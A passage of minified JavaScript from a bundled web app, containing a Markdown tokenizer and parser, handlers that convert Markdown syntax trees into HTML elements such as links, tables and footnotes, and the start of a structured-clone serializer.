hh={name:"setextUnderline",resolveTo:$y,tokenize:qy};function $y(e,t){let r=e.length,a,o,s;for(;r--;)if(e[r][0]==="enter"){if(e[r][1].type==="content"){a=r;break}e[r][1].type==="paragraph"&&(o=r)}else e[r][1].type==="content"&&e.splice(r,1),!s&&e[r][1].type==="definition"&&(s=r);const l={type:"setextHeading",start:{...e[a][1].start},end:{...e[e.length-1][1].end}};return e[o][1].type="setextHeadingText",s?(e.splice(o,0,["enter",l,t]),e.splice(s+1,0,["exit",e[a][1],t]),e[a][1].end={...e[s][1].end}):e[a][1]=l,e.push(["exit",l,t]),e}function qy(e,t,r){const a=this;let o;return s;function s(g){let T=a.events.length,E;for(;T--;)if(a.events[T][1].type!=="lineEnding"&&a.events[T][1].type!=="linePrefix"&&a.events[T][1].type!=="content"){E=a.events[T][1].type==="paragraph";break}return!a.parser.lazy[a.now().line]&&(a.interrupt||E)?(e.enter("setextHeadingLine"),o=g,l(g)):r(g)}function l(g){return e.enter("setextHeadingLineSequence"),h(g)}function h(g){return g===o?(e.consume(g),h):(e.exit("setextHeadingLineSequence"),we(g)?De(e,p,"lineSuffix")(g):p(g))}function p(g){return g===null||Te(g)?(e.exit("setextHeadingLine"),t(g)):r(g)}}const Ky={tokenize:Jy};function Jy(e){const t=this,r=e.attempt(Ha,a,e.attempt(this.parser.constructs.flowInitial,o,De(e,e.attempt(this.parser.constructs.flow,o,e.attempt(ry,o)),"linePrefix")));return r;function a(s){if(s===null){e.consume(s);return}return e.enter("lineEndingBlank"),e.consume(s),e.exit("lineEndingBlank"),t.currentConstruct=void 0,r}function o(s){if(s===null){e.consume(s);return}return e.enter("lineEnding"),e.consume(s),e.exit("lineEnding"),t.currentConstruct=void 0,r}}const Zy={resolveAll:qp()},eC=$p("string"),tC=$p("text");function $p(e){return{resolveAll:qp(e==="text"?nC:void 0),tokenize:t};function t(r){const a=this,o=this.parser.constructs[e],s=r.attempt(o,l,h);return l;function l(T){return g(T)?s(T):h(T)}function h(T){if(T===null){r.consume(T);return}return r.enter("data"),r.consume(T),p}function p(T){return g(T)?(r.exit("data"),s(T)):(r.consume(T),p)}function g(T){if(T===null)return!0;const E=o[T];let _=-1;if(E)for(;++_<E.length;){const S=E[_];if(!S.previous||S.previous.call(a,a.previous))return!0}return!1}}}function qp(e){return t;function t(r,a){let o=-1,s;for(;++o<=r.length;)s===void 0?r[o]&&r[o][1].type==="data"&&(s=o,o++):(!r[o]||r[o][1].type!=="data")&&(o!==s+2&&(r[s][1].end=r[o-1][1].end,r.splice(s+2,o-s-2),o=s+2),s=void 0);return e?e(r,a):r}}function nC(e,t){let r=0;for(;++r<=e.length;)if((r===e.length||e[r][1].type==="lineEnding")&&e[r-1][1].type==="data"){const a=e[r-1][1],o=t.sliceStream(a);let s=o.length,l=-1,h=0,p;for(;s--;){const g=o[s];if(typeof g=="string"){for(l=g.length;g.charCodeAt(l-1)===32;)h++,l--;if(l)break;l=-1}else if(g===-2)p=!0,h++;else if(g!==-1){s++;break}}if(t._contentTypeTextTrailing&&r===e.length&&(h=0),h){const g={type:r===e.length||p||h<2?"lineSuffix":"hardBreakTrailing",start:{_bufferIndex:s?l:a.start._bufferIndex+l,_index:a.start._index+s,line:a.end.line,column:a.end.column-h,offset:a.end.offset-h},end:{...a.end}};a.end={...g.start},a.start.offset===a.end.offset?Object.assign(a,g):(e.splice(r,0,["enter",g,t],["exit",g,t]),r+=2)}r++}return e}const rC={42:wt,43:wt,45:wt,48:wt,49:wt,50:wt,51:wt,52:wt,53:wt,54:wt,55:wt,56:wt,57:wt,62:Wp},iC={91:sy},aC={[-2]:wl,[-1]:wl,32:wl},uC={35:py,42:co,45:[hh,co],60:Ty,61:hh,95:co,96:dh,126:dh},oC={38:Qp,92:jp},sC={[-5]:Dl,[-4]:Dl,[-3]:Dl,33:My,38:Qp,42:oc,60:[BS,Ay],91:By,92:[fy,jp],93:Ac,95:oc,96:KS},lC={null:[oc,Zy]},cC={null:[42,95]},dC={null:[]},fC=Object.freeze(Object.defineProperty({__proto__:null,attentionMarkers:cC,contentInitial:iC,disable:dC,document:rC,flow:uC,flowInitial:aC,insideSpan:lC,string:oC,text:sC},Symbol.toStringTag,{value:"Module"}));function hC(e,t,r){let a={_bufferIndex:-1,_index:0,line:r&&r.line||1,column:r&&r.column||1,offset:r&&r.offset||0};const o={},s=[];let l=[],h=[];const p={attempt:me(de),check:me(z),consume:Q,enter:j,exit:ie,interrupt:me(z,{interrupt:!0})},g={code:null,containerState:{},defineSkip:F,events:[],now:I,parser:e,previous:null,sliceSerialize:_,sliceStream:S,write:E};let T=t.tokenize.call(g,p);return t.resolveAll&&s.push(t),g;function E(ue){return l=qt(l,ue),P(),l[l.length-1]!==null?[]:(Se(t,0),g.events=vo(s,g.events,g),g.events)}function _(ue,oe){return mC(S(ue),oe)}function S(ue){return pC(l,ue)}function I(){const{_bufferIndex:ue,_index:oe,line:Ae,column:ce,offset:re}=a;return{_bufferIndex:ue,_index:oe,line:Ae,column:ce,offset:re}}function F(ue){o[ue.line]=ue.column,H()}function P(){let ue;for(;a._index<l.length;){const oe=l[a._index];if(typeof oe=="string")for(ue=a._index,a._bufferIndex<0&&(a._bufferIndex=0);a._index===ue&&a._bufferIndex<oe.length;)w(oe.charCodeAt(a._bufferIndex));else w(oe)}}function w(ue){T=T(ue)}function Q(ue){Te(ue)?(a.line++,a.column=1,a.offset+=ue===-3?2:1,H()):ue!==-1&&(a.column++,a.offset++),a._bufferIndex<0?a._index++:(a._bufferIndex++,a._bufferIndex===l[a._index].length&&(a._bufferIndex=-1,a._index++)),g.previous=ue}function j(ue,oe){const Ae=oe||{};return Ae.type=ue,Ae.start=I(),g.events.push(["enter",Ae,g]),h.push(Ae),Ae}function ie(ue){const oe=h.pop();return oe.end=I(),g.events.push(["exit",oe,g]),oe}function de(ue,oe){Se(ue,oe.from)}function z(ue,oe){oe.restore()}function me(ue,oe){return Ae;function Ae(ce,re,Le){let ke,ee,pe,C;return Array.isArray(ce)?X(ce):"tokenize"in ce?X([ce]):O(ce);function O(be){return Be;function Be(ve){const Ue=ve!==null&&be[ve],nt=ve!==null&&be.null,_n=[...Array.isArray(Ue)?Ue:Ue?[Ue]:[],...Array.isArray(nt)?nt:nt?[nt]:[]];return X(_n)(ve)}}function X(be){return ke=be,ee=0,be.length===0?Le:L(be[ee])}function L(be){return Be;function Be(ve){return C=xe(),pe=be,be.partial||(g.currentConstruct=be),be.name&&g.parser.constructs.disable.null.includes(be.name)?Ne():be.tokenize.call(oe?Object.assign(Object.create(g),oe):g,p,_e,Ne)(ve)}}function _e(be){return ue(pe,C),re}function Ne(be){return C.restore(),++ee<ke.length?L(ke[ee]):Le}}}function Se(ue,oe){ue.resolveAll&&!s.includes(ue)&&s.push(ue),ue.resolve&&Wt(g.events,oe,g.events.length-oe,ue.resolve(g.events.slice(oe),g)),ue.resolveTo&&(g.events=ue.resolveTo(g.events,g))}function xe(){const ue=I(),oe=g.previous,Ae=g.currentConstruct,ce=g.events.length,re=Array.from(h);return{from:ce,restore:Le};function Le(){a=ue,g.previous=oe,g.currentConstruct=Ae,g.events.length=ce,h=re,H()}}function H(){a.line in o&&a.column<2&&(a.column=o[a.line],a.offset+=o[a.line]-1)}}function pC(e,t){const r=t.start._index,a=t.start._bufferIndex,o=t.end._index,s=t.end._bufferIndex;let l;if(r===o)l=[e[r].slice(a,s)];else{if(l=e.slice(r,o),a>-1){const h=l[0];typeof h=="string"?l[0]=h.slice(a):l.shift()}s>0&&l.push(e[o].slice(0,s))}return l}function mC(e,t){let r=-1;const a=[];let o;for(;++r<e.length;){const s=e[r];let l;if(typeof s=="string")l=s;else switch(s){case-5:{l="\r";break}case-4:{l=`
`;break}case-3:{l=`\r
`;break}case-2:{l=t?" ":"	";break}case-1:{if(!t&&o)continue;l=" ";break}default:l=String.fromCharCode(s)}o=s===-2,a.push(l)}return a.join("")}function gC(e){const a={constructs:Up([fC,...(e||{}).extensions||[]]),content:o(RS),defined:[],document:o(PS),flow:o(Ky),lazy:{},string:o(eC),text:o(tC)};return a;function o(s){return l;function l(h){return hC(a,s,h)}}}function EC(e){for(;!Yp(e););return e}const ph=/[\0\t\n\r]/g;function TC(){let e=1,t="",r=!0,a;return o;function o(s,l,h){const p=[];let g,T,E,_,S;for(s=t+(typeof s=="string"?s.toString():new TextDecoder(l||void 0).decode(s)),E=0,t="",r&&(s.charCodeAt(0)===65279&&E++,r=void 0);E<s.length;){if(ph.lastIndex=E,g=ph.exec(s),_=g&&g.index!==void 0?g.index:s.length,S=s.charCodeAt(_),!g){t=s.slice(E);break}if(S===10&&E===_&&a)p.push(-3),a=void 0;else switch(a&&(p.push(-5),a=void 0),E<_&&(p.push(s.slice(E,_)),e+=_-E),S){case 0:{p.push(65533),e++;break}case 9:{for(T=Math.ceil(e/4)*4,p.push(-2);e++<T;)p.push(-1);break}case 10:{p.push(-4),e=1;break}default:a=!0,e=1}E=_+1}return h&&(a&&p.push(-5),t&&p.push(t),p.push(null)),p}}const bC=/\\([!-/:-@[-`{-~])|&(#(?:\d{1,7}|x[\da-f]{1,6})|[\da-z]{1,31});/gi;function _C(e){return e.replace(bC,SC)}function SC(e,t,r){if(t)return t;if(r.charCodeAt(0)===35){const o=r.charCodeAt(1),s=o===120||o===88;return zp(r.slice(s?2:1),s?16:10)}return xc(r)||e}const Kp={}.hasOwnProperty;function yC(e,t,r){return t&&typeof t=="object"&&(r=t,t=void 0),CC(r)(EC(gC(r).document().write(TC()(e,t,!0))))}function CC(e){const t={transforms:[],canContainEols:["emphasis","fragment","heading","paragraph","strong"],enter:{autolink:s(Fr),autolinkProtocol:xe,autolinkEmail:xe,atxHeading:s(Li),blockQuote:s(nt),characterEscape:xe,characterReference:xe,codeFenced:s(_n),codeFencedFenceInfo:l,codeFencedFenceMeta:l,codeIndented:s(_n,l),codeText:s(ja,l),codeTextData:xe,data:xe,codeFlowValue:xe,definition:s(Dr),definitionDestinationString:l,definitionLabelString:l,definitionTitleString:l,emphasis:s(Ai),hardBreakEscape:s(ki),hardBreakTrailing:s(ki),htmlFlow:s(Mr,l),htmlFlowData:xe,htmlText:s(Mr,l),htmlTextData:xe,image:s(Qa),label:l,link:s(Fr),listItem:s(wn),listItemValue:_,listOrdered:s(Pn,E),listUnordered:s(Pn),paragraph:s(Ii),reference:L,referenceString:l,resourceDestinationString:l,resourceTitleString:l,setextHeading:s(Li),strong:s(Ya),thematicBreak:s(Ga)},exit:{atxHeading:p(),atxHeadingSequence:de,autolink:p(),autolinkEmail:Ue,autolinkProtocol:ve,blockQuote:p(),characterEscapeValue:H,characterReferenceMarkerHexadecimal:Ne,characterReferenceMarkerNumeric:Ne,characterReferenceValue:be,characterReference:Be,codeFenced:p(P),codeFencedFence:F,codeFencedFenceInfo:S,codeFencedFenceMeta:I,codeFlowValue:H,codeIndented:p(w),codeText:p(re),codeTextData:H,data:H,definition:p(),definitionDestinationString:ie,definitionLabelString:Q,definitionTitleString:j,emphasis:p(),hardBreakEscape:p(oe),hardBreakTrailing:p(oe),htmlFlow:p(Ae),htmlFlowData:H,htmlText:p(ce),htmlTextData:H,image:p(ke),label:pe,labelText:ee,lineEnding:ue,link:p(Le),listItem:p(),listOrdered:p(),listUnordered:p(),paragraph:p(),referenceString:_e,resourceDestinationString:C,resourceTitleString:O,resource:X,setextHeading:p(Se),setextHeadingLineSequence:me,setextHeadingText:z,strong:p(),thematicBreak:p()}};Jp(t,(e||{}).mdastExtensions||[]);const r={};return a;function a(Y){let te={type:"root",children:[]};const ye={stack:[te],tokenStack:[],config:t,enter:h,exit:g,buffer:l,resume:T,data:r},Re=[];let Me=-1;for(;++Me<Y.length;)if(Y[Me][1].type==="listOrdered"||Y[Me][1].type==="listUnordered")if(Y[Me][0]==="enter")Re.push(Me);else{const ht=Re.pop();Me=o(Y,ht,Me)}for(Me=-1;++Me<Y.length;){const ht=t[Y[Me][0]];Kp.call(ht,Y[Me][1].type)&&ht[Y[Me][1].type].call(Object.assign({sliceSerialize:Y[Me][2].sliceSerialize},ye),Y[Me][1])}if(ye.tokenStack.length>0){const ht=ye.tokenStack[ye.tokenStack.length-1];(ht[1]||mh).call(ye,void 0,ht[0])}for(te.position={start:nr(Y.length>0?Y[0][1].start:{line:1,column:1,offset:0}),end:nr(Y.length>0?Y[Y.length-2][1].end:{line:1,column:1,offset:0})},Me=-1;++Me<t.transforms.length;)te=t.transforms[Me](te)||te;return te}function o(Y,te,ye){let Re=te-1,Me=-1,ht=!1,Sn,jt,Dn,fr;for(;++Re<=ye;){const pt=Y[Re];switch(pt[1].type){case"listUnordered":case"listOrdered":case"blockQuote":{pt[0]==="enter"?Me++:Me--,fr=void 0;break}case"lineEndingBlank":{pt[0]==="enter"&&(Sn&&!fr&&!Me&&!Dn&&(Dn=Re),fr=void 0);break}case"linePrefix":case"listItemValue":case"listItemMarker":case"listItemPrefix":case"listItemPrefixWhitespace":break;default:fr=void 0}if(!Me&&pt[0]==="enter"&&pt[1].type==="listItemPrefix"||Me===-1&&pt[0]==="exit"&&(pt[1].type==="listUnordered"||pt[1].type==="listOrdered")){if(Sn){let cn=Re;for(jt=void 0;cn--;){const Mt=Y[cn];if(Mt[1].type==="lineEnding"||Mt[1].type==="lineEndingBlank"){if(Mt[0]==="exit")continue;jt&&(Y[jt][1].type="lineEndingBlank",ht=!0),Mt[1].type="lineEnding",jt=cn}else if(!(Mt[1].type==="linePrefix"||Mt[1].type==="blockQuotePrefix"||Mt[1].type==="blockQuotePrefixWhitespace"||Mt[1].type==="blockQuoteMarker"||Mt[1].type==="listItemIndent"))break}Dn&&(!jt||Dn<jt)&&(Sn._spread=!0),Sn.end=Object.assign({},jt?Y[jt][1].start:pt[1].end),Y.splice(jt||Re,0,["exit",Sn,pt[2]]),Re++,ye++}if(pt[1].type==="listItemPrefix"){const cn={type:"listItem",_spread:!1,start:Object.assign({},pt[1].start),end:void 0};Sn=cn,Y.splice(Re,0,["enter",cn,pt[2]]),Re++,ye++,Dn=void 0,fr=!0}}}return Y[te][1]._spread=ht,ye}function s(Y,te){return ye;function ye(Re){h.call(this,Y(Re),Re),te&&te.call(this,Re)}}function l(){this.stack.push({type:"fragment",children:[]})}function h(Y,te,ye){this.stack[this.stack.length-1].children.push(Y),this.stack.push(Y),this.tokenStack.push([te,ye||void 0]),Y.position={start:nr(te.start),end:void 0}}function p(Y){return te;function te(ye){Y&&Y.call(this,ye),g.call(this,ye)}}function g(Y,te){const ye=this.stack.pop(),Re=this.tokenStack.pop();if(Re)Re[0].type!==Y.type&&(te?te.call(this,Y,Re[0]):(Re[1]||mh).call(this,Y,Re[0]));else throw new Error("Cannot close `"+Y.type+"` ("+_a({start:Y.start,end:Y.end})+"): it’s not open");ye.position.end=nr(Y.end)}function T(){return Cc(this.stack.pop())}function E(){this.data.expectingFirstListItemValue=!0}function _(Y){if(this.data.expectingFirstListItemValue){const te=this.stack[this.stack.length-2];te.start=Number.parseInt(this.sliceSerialize(Y),10),this.data.expectingFirstListItemValue=void 0}}function S(){const Y=this.resume(),te=this.stack[this.stack.length-1];te.lang=Y}function I(){const Y=this.resume(),te=this.stack[this.stack.length-1];te.meta=Y}function F(){this.data.flowCodeInside||(this.buffer(),this.data.flowCodeInside=!0)}function P(){const Y=this.resume(),te=this.stack[this.stack.length-1];te.value=Y.replace(/^(\r?\n|\r)|(\r?\n|\r)$/g,""),this.data.flowCodeInside=void 0}function w(){const Y=this.resume(),te=this.stack[this.stack.length-1];te.value=Y.replace(/(\r?\n|\r)$/g,"")}function Q(Y){const te=this.resume(),ye=this.stack[this.stack.length-1];ye.label=te,ye.identifier=sn(this.sliceSerialize(Y)).toLowerCase()}function j(){const Y=this.resume(),te=this.stack[this.stack.length-1];te.title=Y}function ie(){const Y=this.resume(),te=this.stack[this.stack.length-1];te.url=Y}function de(Y){const te=this.stack[this.stack.length-1];if(!te.depth){const ye=this.sliceSerialize(Y).length;te.depth=ye}}function z(){this.data.setextHeadingSlurpLineEnding=!0}function me(Y){const te=this.stack[this.stack.length-1];te.depth=this.sliceSerialize(Y).codePointAt(0)===61?1:2}function Se(){this.data.setextHeadingSlurpLineEnding=void 0}function xe(Y){const ye=this.stack[this.stack.length-1].children;let Re=ye[ye.length-1];(!Re||Re.type!=="text")&&(Re=Xa(),Re.position={start:nr(Y.start),end:void 0},ye.push(Re)),this.stack.push(Re)}function H(Y){const te=this.stack.pop();te.value+=this.sliceSerialize(Y),te.position.end=nr(Y.end)}function ue(Y){const te=this.stack[this.stack.length-1];if(this.data.atHardBreak){const ye=te.children[te.children.length-1];ye.position.end=nr(Y.end),this.data.atHardBreak=void 0;return}!this.data.setextHeadingSlurpLineEnding&&t.canContainEols.includes(te.type)&&(xe.call(this,Y),H.call(this,Y))}function oe(){this.data.atHardBreak=!0}function Ae(){const Y=this.resume(),te=this.stack[this.stack.length-1];te.value=Y}function ce(){const Y=this.resume(),te=this.stack[this.stack.length-1];te.value=Y}function re(){const Y=this.resume(),te=this.stack[this.stack.length-1];te.value=Y}function Le(){const Y=this.stack[this.stack.length-1];if(this.data.inReference){const te=this.data.referenceType||"shortcut";Y.type+="Reference",Y.referenceType=te,delete Y.url,delete Y.title}else delete Y.identifier,delete Y.label;this.data.referenceType=void 0}function ke(){const Y=this.stack[this.stack.length-1];if(this.data.inReference){const te=this.data.referenceType||"shortcut";Y.type+="Reference",Y.referenceType=te,delete Y.url,delete Y.title}else delete Y.identifier,delete Y.label;this.data.referenceType=void 0}function ee(Y){const te=this.sliceSerialize(Y),ye=this.stack[this.stack.length-2];ye.label=_C(te),ye.identifier=sn(te).toLowerCase()}function pe(){const Y=this.stack[this.stack.length-1],te=this.resume(),ye=this.stack[this.stack.length-1];if(this.data.inReference=!0,ye.type==="link"){const Re=Y.children;ye.children=Re}else ye.alt=te}function C(){const Y=this.resume(),te=this.stack[this.stack.length-1];te.url=Y}function O(){const Y=this.resume(),te=this.stack[this.stack.length-1];te.title=Y}function X(){this.data.inReference=void 0}function L(){this.data.referenceType="collapsed"}function _e(Y){const te=this.resume(),ye=this.stack[this.stack.length-1];ye.label=te,ye.identifier=sn(this.sliceSerialize(Y)).toLowerCase(),this.data.referenceType="full"}function Ne(Y){this.data.characterReferenceType=Y.type}function be(Y){const te=this.sliceSerialize(Y),ye=this.data.characterReferenceType;let Re;ye?(Re=zp(te,ye==="characterReferenceMarkerNumeric"?10:16),this.data.characterReferenceType=void 0):Re=xc(te);const Me=this.stack[this.stack.length-1];Me.value+=Re}function Be(Y){const te=this.stack.pop();te.position.end=nr(Y.end)}function ve(Y){H.call(this,Y);const te=this.stack[this.stack.length-1];te.url=this.sliceSerialize(Y)}function Ue(Y){H.call(this,Y);const te=this.stack[this.stack.length-1];te.url="mailto:"+this.sliceSerialize(Y)}function nt(){return{type:"blockquote",children:[]}}function _n(){return{type:"code",lang:null,meta:null,value:""}}function ja(){return{type:"inlineCode",value:""}}function Dr(){return{type:"definition",identifier:"",label:null,title:null,url:""}}function Ai(){return{type:"emphasis",children:[]}}function Li(){return{type:"heading",depth:0,children:[]}}function ki(){return{type:"break"}}function Mr(){return{type:"html",value:""}}function Qa(){return{type:"image",title:null,url:"",alt:null}}function Fr(){return{type:"link",title:null,url:"",children:[]}}function Pn(Y){return{type:"list",ordered:Y.type==="listOrdered",start:null,spread:Y._spread,children:[]}}function wn(Y){return{type:"listItem",spread:Y._spread,checked:null,children:[]}}function Ii(){return{type:"paragraph",children:[]}}function Ya(){return{type:"strong",children:[]}}function Xa(){return{type:"text",value:""}}function Ga(){return{type:"thematicBreak"}}}function nr(e){return{line:e.line,column:e.column,offset:e.offset}}function Jp(e,t){let r=-1;for(;++r<t.length;){const a=t[r];Array.isArray(a)?Jp(e,a):xC(e,a)}}function xC(e,t){let r;for(r in t)if(Kp.call(t,r))switch(r){case"canContainEols":{const a=t[r];a&&e[r].push(...a);break}case"transforms":{const a=t[r];a&&e[r].push(...a);break}case"enter":case"exit":{const a=t[r];a&&Object.assign(e[r],a);break}}}function mh(e,t){throw e?new Error("Cannot close `"+e.type+"` ("+_a({start:e.start,end:e.end})+"): a different token (`"+t.type+"`, "+_a({start:t.start,end:t.end})+") is open"):new Error("Cannot close document, a token (`"+t.type+"`, "+_a({start:t.start,end:t.end})+") is still open")}function AC(e){const t=this;t.parser=r;function r(a){return yC(a,{...t.data("settings"),...e,extensions:t.data("micromarkExtensions")||[],mdastExtensions:t.data("fromMarkdownExtensions")||[]})}}function LC(e,t){const r={type:"element",tagName:"blockquote",properties:{},children:e.wrap(e.all(t),!0)};return e.patch(t,r),e.applyData(t,r)}function kC(e,t){const r={type:"element",tagName:"br",properties:{},children:[]};return e.patch(t,r),[e.applyData(t,r),{type:"text",value:`
`}]}function IC(e,t){const r=t.value?t.value+`
`:"",a={},o=t.lang?t.lang.split(/\s+/):[];o.length>0&&(a.className=["language-"+o[0]]);let s={type:"element",tagName:"code",properties:a,children:[{type:"text",value:r}]};return t.meta&&(s.data={meta:t.meta}),e.patch(t,s),s=e.applyData(t,s),s={type:"element",tagName:"pre",properties:{},children:[s]},e.patch(t,s),s}function NC(e,t){const r={type:"element",tagName:"del",properties:{},children:e.all(t)};return e.patch(t,r),e.applyData(t,r)}function vC(e,t){const r={type:"element",tagName:"em",properties:{},children:e.all(t)};return e.patch(t,r),e.applyData(t,r)}function RC(e,t){const r=typeof e.options.clobberPrefix=="string"?e.options.clobberPrefix:"user-content-",a=String(t.identifier).toUpperCase(),o=Si(a.toLowerCase()),s=e.footnoteOrder.indexOf(a);let l,h=e.footnoteCounts.get(a);h===void 0?(h=0,e.footnoteOrder.push(a),l=e.footnoteOrder.length):l=s+1,h+=1,e.footnoteCounts.set(a,h);const p={type:"element",tagName:"a",properties:{href:"#"+r+"fn-"+o,id:r+"fnref-"+o+(h>1?"-"+h:""),dataFootnoteRef:!0,ariaDescribedBy:["footnote-label"]},children:[{type:"text",value:String(l)}]};e.patch(t,p);const g={type:"element",tagName:"sup",properties:{},children:[p]};return e.patch(t,g),e.applyData(t,g)}function OC(e,t){const r={type:"element",tagName:"h"+t.depth,properties:{},children:e.all(t)};return e.patch(t,r),e.applyData(t,r)}function PC(e,t){if(e.options.allowDangerousHtml){const r={type:"raw",value:t.value};return e.patch(t,r),e.applyData(t,r)}}function Zp(e,t){const r=t.referenceType;let a="]";if(r==="collapsed"?a+="[]":r==="full"&&(a+="["+(t.label||t.identifier)+"]"),t.type==="imageReference")return[{type:"text",value:"!["+t.alt+a}];const o=e.all(t),s=o[0];s&&s.type==="text"?s.value="["+s.value:o.unshift({type:"text",value:"["});const l=o[o.length-1];return l&&l.type==="text"?l.value+=a:o.push({type:"text",value:a}),o}function wC(e,t){const r=String(t.identifier).toUpperCase(),a=e.definitionById.get(r);if(!a)return Zp(e,t);const o={src:Si(a.url||""),alt:t.alt};a.title!==null&&a.title!==void 0&&(o.title=a.title);const s={type:"element",tagName:"img",properties:o,children:[]};return e.patch(t,s),e.applyData(t,s)}function DC(e,t){const r={src:Si(t.url)};t.alt!==null&&t.alt!==void 0&&(r.alt=t.alt),t.title!==null&&t.title!==void 0&&(r.title=t.title);const a={type:"element",tagName:"img",properties:r,children:[]};return e.patch(t,a),e.applyData(t,a)}function MC(e,t){const r={type:"text",value:t.value.replace(/\r?\n|\r/g," ")};e.patch(t,r);const a={type:"element",tagName:"code",properties:{},children:[r]};return e.patch(t,a),e.applyData(t,a)}function FC(e,t){const r=String(t.identifier).toUpperCase(),a=e.definitionById.get(r);if(!a)return Zp(e,t);const o={href:Si(a.url||"")};a.title!==null&&a.title!==void 0&&(o.title=a.title);const s={type:"element",tagName:"a",properties:o,children:e.all(t)};return e.patch(t,s),e.applyData(t,s)}function BC(e,t){const r={href:Si(t.url)};t.title!==null&&t.title!==void 0&&(r.title=t.title);const a={type:"element",tagName:"a",properties:r,children:e.all(t)};return e.patch(t,a),e.applyData(t,a)}function HC(e,t,r){const a=e.all(t),o=r?UC(r):em(t),s={},l=[];if(typeof t.checked=="boolean"){const T=a[0];let E;T&&T.type==="element"&&T.tagName==="p"?E=T:(E={type:"element",tagName:"p",properties:{},children:[]},a.unshift(E)),E.children.length>0&&E.children.unshift({type:"text",value:" "}),E.children.unshift({type:"element",tagName:"input",properties:{type:"checkbox",checked:t.checked,disabled:!0},children:[]}),s.className=["task-list-item"]}let h=-1;for(;++h<a.length;){const T=a[h];(o||h!==0||T.type!=="element"||T.tagName!=="p")&&l.push({type:"text",value:`
`}),T.type==="element"&&T.tagName==="p"&&!o?l.push(...T.children):l.push(T)}const p=a[a.length-1];p&&(o||p.type!=="element"||p.tagName!=="p")&&l.push({type:"text",value:`
`});const g={type:"element",tagName:"li",properties:s,children:l};return e.patch(t,g),e.applyData(t,g)}function UC(e){let t=!1;if(e.type==="list"){t=e.spread||!1;const r=e.children;let a=-1;for(;!t&&++a<r.length;)t=em(r[a])}return t}function em(e){const t=e.spread;return t??e.children.length>1}function zC(e,t){const r={},a=e.all(t);let o=-1;for(typeof t.start=="number"&&t.start!==1&&(r.start=t.start);++o<a.length;){const l=a[o];if(l.type==="element"&&l.tagName==="li"&&l.properties&&Array.isArray(l.properties.className)&&l.properties.className.includes("task-list-item")){r.className=["contains-task-list"];break}}const s={type:"element",tagName:t.ordered?"ol":"ul",properties:r,children:e.wrap(a,!0)};return e.patch(t,s),e.applyData(t,s)}function WC(e,t){const r={type:"element",tagName:"p",properties:{},children:e.all(t)};return e.patch(t,r),e.applyData(t,r)}function jC(e,t){const r={type:"root",children:e.wrap(e.all(t))};return e.patch(t,r),e.applyData(t,r)}function QC(e,t){const r={type:"element",tagName:"strong",properties:{},children:e.all(t)};return e.patch(t,r),e.applyData(t,r)}function YC(e,t){const r=e.all(t),a=r.shift(),o=[];if(a){const l={type:"element",tagName:"thead",properties:{},children:e.wrap([a],!0)};e.patch(t.children[0],l),o.push(l)}if(r.length>0){const l={type:"element",tagName:"tbody",properties:{},children:e.wrap(r,!0)},h=Tn(t.children[1]),p=Io(t.children[t.children.length-1]);h&&p&&(l.position={start:h,end:p}),o.push(l)}const s={type:"element",tagName:"table",properties:{},children:e.wrap(o,!0)};return e.patch(t,s),e.applyData(t,s)}function XC(e,t,r){const a=r?r.children:void 0,s=(a?a.indexOf(t):1)===0?"th":"td",l=r&&r.type==="table"?r.align:void 0,h=l?l.length:t.children.length;let p=-1;const g=[];for(;++p<h;){const E=t.children[p],_={},S=l?l[p]:void 0;S&&(_.align=S);let I={type:"element",tagName:s,properties:_,children:[]};E&&(I.children=e.all(E),e.patch(E,I),I=e.applyData(E,I)),g.push(I)}const T={type:"element",tagName:"tr",properties:{},children:e.wrap(g,!0)};return e.patch(t,T),e.applyData(t,T)}function GC(e,t){const r={type:"element",tagName:"td",properties:{},children:e.all(t)};return e.patch(t,r),e.applyData(t,r)}const gh=9,Eh=32;function VC(e){const t=String(e),r=/\r?\n|\r/g;let a=r.exec(t),o=0;const s=[];for(;a;)s.push(Th(t.slice(o,a.index),o>0,!0),a[0]),o=a.index+a[0].length,a=r.exec(t);return s.push(Th(t.slice(o),o>0,!1)),s.join("")}function Th(e,t,r){let a=0,o=e.length;if(t){let s=e.codePointAt(a);for(;s===gh||s===Eh;)a++,s=e.codePointAt(a)}if(r){let s=e.codePointAt(o-1);for(;s===gh||s===Eh;)o--,s=e.codePointAt(o-1)}return o>a?e.slice(a,o):""}function $C(e,t){const r={type:"text",value:VC(String(t.value))};return e.patch(t,r),e.applyData(t,r)}function qC(e,t){const r={type:"element",tagName:"hr",properties:{},children:[]};return e.patch(t,r),e.applyData(t,r)}const KC={blockquote:LC,break:kC,code:IC,delete:NC,emphasis:vC,footnoteReference:RC,heading:OC,html:PC,imageReference:wC,image:DC,inlineCode:MC,linkReference:FC,link:BC,listItem:HC,list:zC,paragraph:WC,root:jC,strong:QC,table:YC,tableCell:GC,tableRow:XC,text:$C,thematicBreak:qC,toml:ro,yaml:ro,definition:ro,footnoteDefinition:ro};function ro(){}const tm=-1,Ro=0,ya=1,Eo=2,Lc=3,kc=4,Ic=5,Nc=6,nm=7,rm=8,JC=typeof self=="object"?self:globalThis,bh=(e,t)=>{switch(e){case"Function":case"SharedWorker":case"Worker":case"eval":case"setInterval":case"setTimeout":throw new TypeError("unable to deserialize "+e)}return new JC[e](t)},ZC=(e,t)=>{const r=(o,s)=>(e.set(s,o),o),a=o=>{if(e.has(o))return e.get(o);const[s,l]=t[o];switch(s){case Ro:case tm:return r(l,o);case ya:{const h=r([],o);for(const p of l)h.push(a(p));return h}case Eo:{const h=r({},o);for(const[p,g]of l)h[a(p)]=a(g);return h}case Lc:return r(new Date(l),o);case kc:{const{source:h,flags:p}=l;return r(new RegExp(h,p),o)}case Ic:{const h=r(new Map,o);for(const[p,g]of l)h.set(a(p),a(g));return h}case Nc:{const h=r(new Set,o);for(const p of l)h.add(a(p));return h}case nm:{const{name:h,message:p}=l;return r(bh(h,p),o)}case rm:return r(BigInt(l),o);case"BigInt":return r(Object(BigInt(l)),o);case"ArrayBuffer":return r(new Uint8Array(l).buffer,l);case"DataView":{const{buffer:h}=new Uint8Array(l);return r(new DataView(h),l)}}return r(bh(s,l),o)};return a},_h=e=>ZC(new Map,e)(0),li="",{toString:e3}={},{keys:t3}=Object,ma=e=>{const t=typeof e;if(t!=="object"||!e)return[Ro,t];const r=e3.call(e).slice(8,-1);switch(r){case"Array":return[ya,li];case"Object":return[Eo,li];case"Date":return[Lc,li];case"RegExp":return[kc,li];case"Map":return[Ic,li];case"Set":return[Nc,li];case"DataView":return[ya,r]}return 